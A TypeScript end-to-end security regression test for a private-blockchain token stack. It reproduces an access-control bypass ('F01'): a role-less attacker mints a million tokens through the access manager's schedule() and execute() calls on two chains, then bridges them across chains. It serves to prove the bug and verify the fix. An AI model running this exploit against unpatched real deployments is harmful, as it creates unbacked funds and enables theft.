/**
 * @deprecated Decommissioning Teleport (vanilla, atomic).
 */
/**
 * @title E2E SECURITY: F01 - Cross-PN financial impact + cross-chain teleport via schedule+execute bypass
 *
 * @description Reproduces the F01 schedule+execute bypass and demonstrates
 *              that the resulting fake mint is REAL ERC20 supply that can
 *              traverse the bridge into a different Privacy Node — proving
 *              the vulnerability produces transferable, off-rampable value.
 *
 *              Single, comprehensive scenario with three phases. Each phase
 *              prints a full state snapshot of attacker balance + total
 *              supply on every relevant chain BEFORE and AFTER the action,
 *              so a reader can follow exactly where value moves.
 *
 *              PHASE 1 — Snapshot baseline. Three observation points:
 *                - tokenA on PN-A   (the token whose mint we will hijack)
 *                - tokenB on PN-B   (a separate token, demonstrates per-PN
 *                                    independence)
 *                - tokenA's mirror on PN-B (the address auto-deployed when
 *                                    a teleport from PN-A first lands on
 *                                    PN-B; resolved via the endpoint)
 *
 *              PHASE 2a — Bypass on PN-A: mint 1M tokenA to attacker.
 *                Snapshot all observation points before/after.
 *
 *              PHASE 2b — Independent bypass on PN-B: mint 1M tokenB to
 *                attacker. Proves the bug is per-manager but applies on
 *                every chain.
 *
 *              PHASE 3 — Teleport phase. Attacker calls
 *                tokenA.teleport(attacker, 1M, PN_B_chainId) on PN-A.
 *                This burns the 1M tokenA on PN-A and emits a cross-chain
 *                message. The relayer delivers to PN-B; PN-B auto-deploys
 *                tokenA's mirror (if not already deployed) and mints 1M
 *                to attacker. Final snapshot proves the attacker now
 *                holds REAL transferable value on a chain they had no
 *                prior interaction with.
 *
 *              PHASE 4 — Final assertion: attacker's combined balance
 *                across all observation points MUST be 0. Pre-fix it is
 *                3M (1M tokenA on PN-A burned in teleport leaves 0;
 *                + 1M tokenB on PN-B from independent mint
 *                + 1M tokenA-mirror on PN-B from teleport delivery).
 *                Post-fix the schedule reverts in PHASE 2a/2b, no mint
 *                lands, no teleport is possible (no balance to teleport),
 *                everything is 0 from the start.
 *
 * RESTORATION:
 *   This test mints REAL ERC20 supply on the live test network. The
 *   teleport burns part of it; the rest remains. There is no clean undo.
 *   `after` hook prints the residual state. Re-deploy the docker stack
 *   (./start_dev.sh --clean 6) before re-running unrelated tests if
 *   reproducible state is required.
 *
 * EXPECTED BEHAVIOUR:
 *   Pre-fix: the test FAILS with a long structured log showing the
 *            attacker minted real tokens on TWO PNs and successfully
 *            teleported value cross-chain — proving real fund-loss.
 *   Post-fix: schedule reverts on PN-A in PHASE 2a; balances stay zero;
 *             test PASSES.
 */

import { ethers } from 'ethers';
import { expect } from 'chai';
import { DEFAULT_TIMEOUT, GAS_LIMIT, LOGGER } from '../../../src/config/env-config';
import { initializePrivacyNodesAndPnh, PrivacyNodeMap } from '../../setup';
import { PrivateHub } from '../../../src/entities/PrivateHub';
import { PrivacyNode } from '../../../src/entities/PrivacyNode';
import { ERC20Wrapper } from '../../../src/entities/tokens/ERC20Wrapper';
import {
  RaylsAccessManagerV1__factory,
  ProductionErc20Token,
  ProductionErc20Token__factory,
  EndpointV1__factory,
} from '../../../typechain-types';
import { createUserOperator } from '../../../src/utils/wallet-factory';

const ATTACKER_MINT_AMOUNT = ethers.parseUnits('1000000', 18); // 1,000,000 tokens
const TELEPORT_AMOUNT = ATTACKER_MINT_AMOUNT;                  // teleport ALL minted tokenA from PN-A to PN-B
const TELEPORT_POLL_TIMEOUT_MS = 60_000;                       // 60s for relayer round-trip

describe('E2E SECURITY: F01 - Cross-PN financial impact (mint via bypass + cross-chain teleport) @decommissioned', function () {
  this.timeout(DEFAULT_TIMEOUT);

  let privacyNodes: PrivacyNodeMap;
  let privateHub: PrivateHub;
  let tokenA: ERC20Wrapper<ProductionErc20Token>;
  let tokenB: ERC20Wrapper<ProductionErc20Token>;
  let attackerSeed: ethers.HDNodeWallet;

  before(async function () {
    LOGGER.log('\n   ═══════════════════════════════════════════════════════════════');
    LOGGER.log('   F01 CROSS-PN FINANCIAL IMPACT (with teleport demo) — E2E setup');
    LOGGER.log('   ═══════════════════════════════════════════════════════════════');

    const { initializedNodes, initializedPNH } = await initializePrivacyNodesAndPnh(2);
    privacyNodes = initializedNodes;
    privateHub = initializedPNH;

    LOGGER.log(`   PN-A chainId         : ${privacyNodes.A.chainId}`);
    LOGGER.log(`   PN-B chainId         : ${privacyNodes.B.chainId}`);
    LOGGER.log(`   PNH chainId          : ${(await privateHub.provider.getNetwork()).chainId}`);

    // Deploy + register tokenA on PN-A. After registration, the resourceId
    // is broadcast to all participants — PN-B can auto-deploy a mirror on
    // first teleport delivery (or via explicit lookup).
    LOGGER.log('   Deploying tokenA on PN-A and registering through PNH ...');
    tokenA = new ERC20Wrapper<ProductionErc20Token>(privacyNodes.A, ProductionErc20Token__factory);
    tokenA.setFields('f01-pna');
    await tokenA.deploy();
    await tokenA.activateOnPn();
    await tokenA.activateOnHub(privateHub);
    LOGGER.log(`   tokenA.symbol        : ${tokenA.symbol}`);
    LOGGER.log(`   tokenA.resourceId    : ${tokenA.resourceId}`);
    LOGGER.log(`   tokenA addr on PN-A  : ${tokenA.address[privacyNodes.A.chainId]}`);

    LOGGER.log('   Deploying tokenB on PN-B and registering through PNH ...');
    tokenB = new ERC20Wrapper<ProductionErc20Token>(privacyNodes.B, ProductionErc20Token__factory);
    tokenB.setFields('f01-pnb');
    await tokenB.deploy();
    await tokenB.activateOnPn();
    await tokenB.activateOnHub(privateHub);
    LOGGER.log(`   tokenB.symbol        : ${tokenB.symbol}`);
    LOGGER.log(`   tokenB.resourceId    : ${tokenB.resourceId}`);
    LOGGER.log(`   tokenB addr on PN-B  : ${tokenB.address[privacyNodes.B.chainId]}`);

    attackerSeed = createUserOperator(privacyNodes.A.provider);
    LOGGER.log(`   Attacker (no roles)  : ${attackerSeed.address}`);

    for (const node of [privacyNodes.A, privacyNodes.B]) {
      const fundTx = await node.adminWallet.sendTransaction({
        to: attackerSeed.address,
        value: ethers.parseEther('0.5'),
      });
      await fundTx.wait();
      LOGGER.log(`   Funded attacker on chainId=${node.chainId}: 0.5 ETH (tx ${fundTx.hash})`);
    }
  });

  after(async function () {
    try {
      const snapshot = await captureFullState({
        privacyNodes,
        tokenA,
        tokenB,
        attacker: attackerSeed.address,
      });
      LOGGER.log('\n   ── FINAL RESIDUAL STATE ──');
      printState(snapshot, 'after-hook');
      const totalAttackerHoldings =
        snapshot.attackerBalanceTokenA_PNA +
        snapshot.attackerBalanceTokenB_PNB +
        snapshot.attackerBalanceTokenA_PNB;
      if (totalAttackerHoldings > 0n) {
        LOGGER.log(`   ⚠️  Attacker holds ${totalAttackerHoldings} units of real ERC20 supply across the topology.`);
        LOGGER.log('   ⚠️  Test corrupted token supply on the live network. Re-deploy with ./start_dev.sh --clean 6.');
      }
    } catch (e) {
      LOGGER.log(`   after-hook log failed: ${e}`);
    }
  });

  // ════════════════════════════════════════════════════════════════════════
  //  BASELINE — direct attacker mint MUST revert on each PN.
  // ════════════════════════════════════════════════════════════════════════

  it('F01-CROSSPN-baseline: attacker direct mint reverts on PN-A AND PN-B (role gate works on the normal path)', async function () {
    const attackerOnA = attackerSeed.connect(privacyNodes.A.provider);
    const tokenAAsAttacker = ProductionErc20Token__factory.connect(
      tokenA.address[privacyNodes.A.chainId],
      attackerOnA,
    );
    let revertedA = false;
    let reasonA = '';
    try {
      const tx = await tokenAAsAttacker.mint(attackerSeed.address, 1n, { gasLimit: GAS_LIMIT });
      await tx.wait();
    } catch (e: any) {
      revertedA = true;
      reasonA = e?.shortMessage || e?.message || String(e);
    }
    LOGGER.log(`   PN-A direct mint reverted? ${revertedA} ${reasonA ? '(' + reasonA + ')' : ''}`);
    expect(revertedA, 'attacker MUST be unable to call mint() directly on PN-A').to.equal(true);

    const attackerOnB = attackerSeed.connect(privacyNodes.B.provider);
    const tokenBAsAttacker = ProductionErc20Token__factory.connect(
      tokenB.address[privacyNodes.B.chainId],
      attackerOnB,
    );
    let revertedB = false;
    let reasonB = '';
    try {
      const tx = await tokenBAsAttacker.mint(attackerSeed.address, 1n, { gasLimit: GAS_LIMIT });
      await tx.wait();
    } catch (e: any) {
      revertedB = true;
      reasonB = e?.shortMessage || e?.message || String(e);
    }
    LOGGER.log(`   PN-B direct mint reverted? ${revertedB} ${reasonB ? '(' + reasonB + ')' : ''}`);
    expect(revertedB, 'attacker MUST be unable to call mint() directly on PN-B').to.equal(true);
  });

  // ════════════════════════════════════════════════════════════════════════
  //  EXPLOIT — single comprehensive scenario:
  //    1. mint on PN-A via bypass
  //    2. mint on PN-B via independent bypass
  //    3. teleport PN-A's freshly minted tokens to PN-B (via the bridge)
  //    4. assert: nothing of value should have moved
  // ════════════════════════════════════════════════════════════════════════

  it('F01-CROSSPN-exploit-FULL: mint-on-A + mint-on-B (independent) + teleport-A-to-B (cross-chain delivery)', async function () {
    LOGGER.log('\n   ─────────────────────────────────────────────────────────────');
    LOGGER.log('   PHASE 1: snapshot baseline state across all observation points');
    LOGGER.log('   ─────────────────────────────────────────────────────────────');
    const baseline = await captureFullState({
      privacyNodes,
      tokenA,
      tokenB,
      attacker: attackerSeed.address,
    });
    printState(baseline, 'BASELINE');

    // ────────────────────────────────────────────────────────────────────
    //  PHASE 2a — bypass on PN-A
    // ────────────────────────────────────────────────────────────────────
    LOGGER.log('\n   ─────────────────────────────────────────────────────────────');
    LOGGER.log('   PHASE 2a: bypass on PN-A — schedule+execute mint(attacker, 1M)');
    LOGGER.log('   ─────────────────────────────────────────────────────────────');
    const phase2aResult = await runMintExploit({
      node: privacyNodes.A,
      tokenAddr: tokenA.address[privacyNodes.A.chainId],
      attackerSeed,
      amount: ATTACKER_MINT_AMOUNT,
      label: 'PN-A',
    });
    const afterPhase2a = await captureFullState({
      privacyNodes,
      tokenA,
      tokenB,
      attacker: attackerSeed.address,
    });
    printState(afterPhase2a, 'AFTER PHASE 2a (mint on PN-A)');
    printDelta(baseline, afterPhase2a, 'PHASE 2a delta');

    // ────────────────────────────────────────────────────────────────────
    //  PHASE 2b — independent bypass on PN-B
    // ────────────────────────────────────────────────────────────────────
    LOGGER.log('\n   ─────────────────────────────────────────────────────────────');
    LOGGER.log('   PHASE 2b: INDEPENDENT bypass on PN-B — schedule+execute mint(attacker, 1M)');
    LOGGER.log('   ─────────────────────────────────────────────────────────────');
    const phase2bResult = await runMintExploit({
      node: privacyNodes.B,
      tokenAddr: tokenB.address[privacyNodes.B.chainId],
      attackerSeed,
      amount: ATTACKER_MINT_AMOUNT,
      label: 'PN-B',
    });
    const afterPhase2b = await captureFullState({
      privacyNodes,
      tokenA,
      tokenB,
      attacker: attackerSeed.address,
    });
    printState(afterPhase2b, 'AFTER PHASE 2b (mint on PN-B)');
    printDelta(afterPhase2a, afterPhase2b, 'PHASE 2b delta');

    // ────────────────────────────────────────────────────────────────────
    //  PHASE 3 — teleport PN-A's freshly minted tokens to PN-B
    //  Uses the legitimate cross-chain bridge. burns on PN-A → relayer
    //  delivers → mints on PN-B's mirror of tokenA. Proves the minted
    //  value is real and transferable through the protocol's own bridge.
    // ────────────────────────────────────────────────────────────────────
    LOGGER.log('\n   ─────────────────────────────────────────────────────────────');
    LOGGER.log('   PHASE 3: teleport PN-A freshly-minted tokens to PN-B (legitimate bridge)');
    LOGGER.log('   ─────────────────────────────────────────────────────────────');
    let teleportTxHash: string | null = null;
    let teleportSucceeded = false;
    let teleportReason = '';

    if (afterPhase2b.attackerBalanceTokenA_PNA >= TELEPORT_AMOUNT) {
      LOGGER.log(`   Pre-condition met: attacker holds ${afterPhase2b.attackerBalanceTokenA_PNA} tokenA on PN-A`);
      LOGGER.log(`   Teleporting ${TELEPORT_AMOUNT} units to attacker @ ${attackerSeed.address} on chainId ${privacyNodes.B.chainId} ...`);

      const attackerOnA = attackerSeed.connect(privacyNodes.A.provider);
      const tokenAAsAttacker = ProductionErc20Token__factory.connect(
        tokenA.address[privacyNodes.A.chainId],
        attackerOnA,
      );
      try {
        const tx = await tokenAAsAttacker.teleport(
          attackerSeed.address,
          TELEPORT_AMOUNT,
          BigInt(privacyNodes.B.chainId),
          { gasLimit: GAS_LIMIT },
        );
        teleportTxHash = (await tx.wait())!.hash;
        teleportSucceeded = true;
        LOGGER.log(`   teleport() SUCCEEDED — tx ${teleportTxHash}`);
      } catch (e: any) {
        teleportReason = e?.shortMessage || e?.message || String(e);
        LOGGER.log(`   teleport() reverted   : ${teleportReason}`);
      }

      // Snapshot the source-side burn immediately.
      const afterTeleportSource = await captureFullState({
        privacyNodes,
        tokenA,
        tokenB,
        attacker: attackerSeed.address,
      });
      printState(afterTeleportSource, 'AFTER teleport SOURCE (burn on PN-A)');
      printDelta(afterPhase2b, afterTeleportSource, 'PHASE 3 source-side delta');

      if (teleportSucceeded) {
        LOGGER.log(`   Polling PN-B for cross-chain delivery (timeout=${TELEPORT_POLL_TIMEOUT_MS}ms) ...`);
        const expected = afterPhase2b.attackerBalanceTokenA_PNB + TELEPORT_AMOUNT;
        const received = await pollAttackerBalanceTokenA_PNB(
          privacyNodes.B,
          tokenA.resourceId,
          attackerSeed.address,
          expected,
          TELEPORT_POLL_TIMEOUT_MS,
        );
        if (received !== null) {
          LOGGER.log(`   Cross-chain delivery COMPLETE. attacker balance on PN-B mirror = ${received}`);
        } else {
          LOGGER.log('   Cross-chain delivery did NOT complete within the timeout.');
        }
      }
    } else {
      LOGGER.log(`   Skipping teleport: attacker has only ${afterPhase2b.attackerBalanceTokenA_PNA} tokenA on PN-A (need ${TELEPORT_AMOUNT}).`);
      LOGGER.log('   This is the EXPECTED post-fix path: PHASE 2a schedule reverted, no balance to teleport.');
    }

    // ────────────────────────────────────────────────────────────────────
    //  PHASE 4 — final state + assertion
    // ────────────────────────────────────────────────────────────────────
    LOGGER.log('\n   ─────────────────────────────────────────────────────────────');
    LOGGER.log('   PHASE 4: final state snapshot + assertion');
    LOGGER.log('   ─────────────────────────────────────────────────────────────');
    const finalState = await captureFullState({
      privacyNodes,
      tokenA,
      tokenB,
      attacker: attackerSeed.address,
    });
    printState(finalState, 'FINAL STATE');
    printDelta(baseline, finalState, 'OVERALL delta (baseline → final)');

    const totalAttackerHoldings =
      finalState.attackerBalanceTokenA_PNA +
      finalState.attackerBalanceTokenB_PNB +
      finalState.attackerBalanceTokenA_PNB;

    if (totalAttackerHoldings > 0n) {
      LOGGER.log('\n   ╔══════════════════════════════════════════════════════════════════╗');
      LOGGER.log('   ║   F01 CROSS-PN: ATTACKER HOLDS REAL VALUE ACROSS THE TOPOLOGY     ║');
      LOGGER.log('   ╚══════════════════════════════════════════════════════════════════╝');
      LOGGER.log(`   attacker tokenA on PN-A : ${finalState.attackerBalanceTokenA_PNA}  (= ${ethers.formatUnits(finalState.attackerBalanceTokenA_PNA, 18)})`);
      LOGGER.log(`   attacker tokenB on PN-B : ${finalState.attackerBalanceTokenB_PNB}  (= ${ethers.formatUnits(finalState.attackerBalanceTokenB_PNB, 18)})`);
      LOGGER.log(`   attacker tokenA on PN-B : ${finalState.attackerBalanceTokenA_PNB}  (= ${ethers.formatUnits(finalState.attackerBalanceTokenA_PNB, 18)})`);
      LOGGER.log(`   total attacker holdings : ${totalAttackerHoldings}  (= ${ethers.formatUnits(totalAttackerHoldings, 18)})`);
      LOGGER.log('   ───── ATTACK SUMMARY ─────');
      LOGGER.log(`   PHASE 2a — bypass on PN-A: ${phase2aResult.scheduleSucceeded ? 'mint LANDED' : 'mint BLOCKED'} (sched=${phase2aResult.scheduleTx} exec=${phase2aResult.executeTx})`);
      LOGGER.log(`   PHASE 2b — bypass on PN-B: ${phase2bResult.scheduleSucceeded ? 'mint LANDED' : 'mint BLOCKED'} (sched=${phase2bResult.scheduleTx} exec=${phase2bResult.executeTx})`);
      LOGGER.log(`   PHASE 3  — teleport: ${teleportSucceeded ? `LANDED (tx ${teleportTxHash})` : 'BLOCKED/SKIPPED'}`);
      LOGGER.log('   These tokens are real ERC20 supply across multiple chains and were');
      LOGGER.log('   created/transferred WITHOUT any prior role grant to the attacker.');
      LOGGER.log('   In production these tokens could be teleported to a public chain and');
      LOGGER.log('   off-ramped via DEX/CEX. The bridge\'s burn-on-source / mint-on-destination');
      LOGGER.log('   conservation invariant is honored — but the source value was created');
      LOGGER.log('   from nothing via the F01 schedule+execute bypass.');
    }

    expect(totalAttackerHoldings, 'F01 CROSS-PN: attacker holds non-zero value across the topology — F01 bypass produced real fund creation')
      .to.equal(0n);
  });
});

// ──────────────────────────────────────────────────────────────────────────
//  Helpers
// ──────────────────────────────────────────────────────────────────────────

interface TopologySnapshot {
  attackerBalanceTokenA_PNA: bigint;
  attackerBalanceTokenB_PNB: bigint;
  attackerBalanceTokenA_PNB: bigint; // address auto-deployed on first teleport
  totalSupplyTokenA_PNA: bigint;
  totalSupplyTokenB_PNB: bigint;
  totalSupplyTokenA_PNB: bigint;
  tokenA_PNB_address: string; // ZeroAddress until teleport delivery
}

async function captureFullState(args: {
  privacyNodes: PrivacyNodeMap;
  tokenA: ERC20Wrapper<ProductionErc20Token>;
  tokenB: ERC20Wrapper<ProductionErc20Token>;
  attacker: string;
}): Promise<TopologySnapshot> {
  const { privacyNodes, tokenA, tokenB, attacker } = args;

  const tokenAOnPNA = ProductionErc20Token__factory.connect(
    tokenA.address[privacyNodes.A.chainId],
    privacyNodes.A.provider,
  );
  const tokenBOnPNB = ProductionErc20Token__factory.connect(
    tokenB.address[privacyNodes.B.chainId],
    privacyNodes.B.provider,
  );
  const [
    attackerBalanceTokenA_PNA,
    totalSupplyTokenA_PNA,
    attackerBalanceTokenB_PNB,
    totalSupplyTokenB_PNB,
  ] = await Promise.all([
    tokenAOnPNA.balanceOf(attacker),
    tokenAOnPNA.totalSupply(),
    tokenBOnPNB.balanceOf(attacker),
    tokenBOnPNB.totalSupply(),
  ]);

  // Resolve tokenA's mirror address on PN-B if it exists yet.
  const endpointPNB = EndpointV1__factory.connect(
    privacyNodes.B.endpointAddress,
    privacyNodes.B.provider,
  );
  let tokenA_PNB_address = ethers.ZeroAddress;
  let attackerBalanceTokenA_PNB = 0n;
  let totalSupplyTokenA_PNB = 0n;
  try {
    const addr = await endpointPNB.getAddressByResourceId(tokenA.resourceId);
    if (addr && addr !== ethers.ZeroAddress) {
      const code = await privacyNodes.B.provider.getCode(addr);
      if (code && code !== '0x') {
        tokenA_PNB_address = addr;
        const tokenA_PNB = ProductionErc20Token__factory.connect(addr, privacyNodes.B.provider);
        [attackerBalanceTokenA_PNB, totalSupplyTokenA_PNB] = await Promise.all([
          tokenA_PNB.balanceOf(attacker),
          tokenA_PNB.totalSupply(),
        ]);
      }
    }
  } catch {
    // not deployed yet, keep zeros
  }

  return {
    attackerBalanceTokenA_PNA,
    attackerBalanceTokenB_PNB,
    attackerBalanceTokenA_PNB,
    totalSupplyTokenA_PNA,
    totalSupplyTokenB_PNB,
    totalSupplyTokenA_PNB,
    tokenA_PNB_address,
  };
}

function printState(s: TopologySnapshot, label: string): void {
  LOGGER.log(`   ── ${label} ──`);
  LOGGER.log(`     tokenA_PN-A : attacker=${s.attackerBalanceTokenA_PNA}  totalSupply=${s.totalSupplyTokenA_PNA}`);
  LOGGER.log(`     tokenB_PN-B : attacker=${s.attackerBalanceTokenB_PNB}  totalSupply=${s.totalSupplyTokenB_PNB}`);
  LOGGER.log(`     tokenA_PN-B : attacker=${s.attackerBalanceTokenA_PNB}  totalSupply=${s.totalSupplyTokenA_PNB}  (mirror addr: ${s.tokenA_PNB_address})`);
}

function printDelta(prev: TopologySnapshot, curr: TopologySnapshot, label: string): void {
  const fmt = (a: bigint, b: bigint): string => {
    const d = b - a;
    if (d === 0n) return '+0';
    return (d > 0n ? '+' : '') + d.toString();
  };
  LOGGER.log(`   ── ${label} ──`);
  LOGGER.log(`     tokenA_PN-A : attacker ${fmt(prev.attackerBalanceTokenA_PNA, curr.attackerBalanceTokenA_PNA)}  totalSupply ${fmt(prev.totalSupplyTokenA_PNA, curr.totalSupplyTokenA_PNA)}`);
  LOGGER.log(`     tokenB_PN-B : attacker ${fmt(prev.attackerBalanceTokenB_PNB, curr.attackerBalanceTokenB_PNB)}  totalSupply ${fmt(prev.totalSupplyTokenB_PNB, curr.totalSupplyTokenB_PNB)}`);
  LOGGER.log(`     tokenA_PN-B : attacker ${fmt(prev.attackerBalanceTokenA_PNB, curr.attackerBalanceTokenA_PNB)}  totalSupply ${fmt(prev.totalSupplyTokenA_PNB, curr.totalSupplyTokenA_PNB)}`);
}

interface MintExploitResult {
  scheduleSucceeded: boolean;
  scheduleTx: string | null;
  scheduleReason: string;
  executeSucceeded: boolean;
  executeTx: string | null;
  executeReason: string;
}

async function runMintExploit(args: {
  node: PrivacyNode;
  tokenAddr: string;
  attackerSeed: ethers.HDNodeWallet;
  amount: bigint;
  label: string;
}): Promise<MintExploitResult> {
  const { node, tokenAddr, attackerSeed, amount, label } = args;
  const attacker = attackerSeed.connect(node.provider);
  const accessManager = await node.getAccessManager();
  const accessManagerAddr = await accessManager.getAddress();

  LOGGER.log(`   ${label} chainId         : ${node.chainId}`);
  LOGGER.log(`   ${label} AccessManager   : ${accessManagerAddr}`);
  LOGGER.log(`   ${label} ProductionErc20Token    : ${tokenAddr}`);
  LOGGER.log(`   attacker              : ${attacker.address}`);

  const mintSelector = ProductionErc20Token__factory.createInterface().getFunction('mint')!.selector;
  const [allowed, delay, paused] = await accessManager.canCall(
    attacker.address,
    tokenAddr,
    mintSelector,
  );
  LOGGER.log(`   canCall(attacker, token, mint.sig) = (allowed=${allowed}, delay=${delay}, paused=${paused})`);

  // Per-call snapshot.
  const token = ProductionErc20Token__factory.connect(tokenAddr, attacker);
  const balanceBefore = await token.balanceOf(attacker.address);
  const supplyBefore = await token.totalSupply();
  LOGGER.log(`   ${label} attacker balance BEFORE : ${balanceBefore}`);
  LOGGER.log(`   ${label} totalSupply       BEFORE: ${supplyBefore}`);

  const calldata = ProductionErc20Token__factory.createInterface().encodeFunctionData('mint', [
    attacker.address,
    amount,
  ]);
  const managerAsAttacker = RaylsAccessManagerV1__factory.connect(accessManagerAddr, attacker);

  let scheduleTx: string | null = null;
  let scheduleSucceeded = false;
  let scheduleReason = '';
  try {
    const tx = await managerAsAttacker.schedule(tokenAddr, calldata, 0, { gasLimit: GAS_LIMIT });
    scheduleTx = (await tx.wait())!.hash;
    scheduleSucceeded = true;
    LOGGER.log(`   ${label} schedule() SUCCEEDED — tx ${scheduleTx}`);
  } catch (e: any) {
    scheduleReason = e?.shortMessage || e?.message || String(e);
    LOGGER.log(`   ${label} schedule() reverted   : ${scheduleReason}`);
  }

  let executeTx: string | null = null;
  let executeSucceeded = false;
  let executeReason = '';
  if (scheduleSucceeded) {
    try {
      const tx = await managerAsAttacker.execute(tokenAddr, calldata, { gasLimit: GAS_LIMIT });
      executeTx = (await tx.wait())!.hash;
      executeSucceeded = true;
      LOGGER.log(`   ${label} execute() SUCCEEDED  — tx ${executeTx}`);
    } catch (e: any) {
      executeReason = e?.shortMessage || e?.message || String(e);
      LOGGER.log(`   ${label} execute() reverted    : ${executeReason}`);
    }
  } else {
    LOGGER.log(`   ${label} execute() skipped (schedule reverted)`);
  }

  const balanceAfter = await token.balanceOf(attacker.address);
  const supplyAfter = await token.totalSupply();
  LOGGER.log(`   ${label} attacker balance AFTER  : ${balanceAfter}  (delta ${(balanceAfter - balanceBefore >= 0n ? '+' : '') + (balanceAfter - balanceBefore)})`);
  LOGGER.log(`   ${label} totalSupply       AFTER : ${supplyAfter}  (delta ${(supplyAfter - supplyBefore >= 0n ? '+' : '') + (supplyAfter - supplyBefore)})`);

  return { scheduleSucceeded, scheduleTx, scheduleReason, executeSucceeded, executeTx, executeReason };
}

async function pollAttackerBalanceTokenA_PNB(
  pnB: PrivacyNode,
  resourceId: string,
  attacker: string,
  expected: bigint,
  timeoutMs: number,
): Promise<bigint | null> {
  const endpointPNB = EndpointV1__factory.connect(pnB.endpointAddress, pnB.provider);
  const start = Date.now();
  let lastBalance: bigint = 0n;
  let lastAddr: string = ethers.ZeroAddress;
  while (Date.now() - start < timeoutMs) {
    try {
      const addr = await endpointPNB.getAddressByResourceId(resourceId);
      if (addr && addr !== ethers.ZeroAddress) {
        const code = await pnB.provider.getCode(addr);
        if (code && code !== '0x') {
          if (addr !== lastAddr) {
            LOGGER.log(`     ... tokenA mirror on PN-B deployed at ${addr}`);
            lastAddr = addr;
          }
          const tok = ProductionErc20Token__factory.connect(addr, pnB.provider);
          const bal: bigint = await tok.balanceOf(attacker);
          if (bal !== lastBalance) {
            LOGGER.log(`     ... attacker balance on PN-B mirror = ${bal} (expected ${expected})`);
            lastBalance = bal;
          }
          if (bal >= expected) return bal;
        }
      }
    } catch {
      // ignore transient
    }
    await new Promise((r) => setTimeout(r, 1000));
  }
  return null;
}
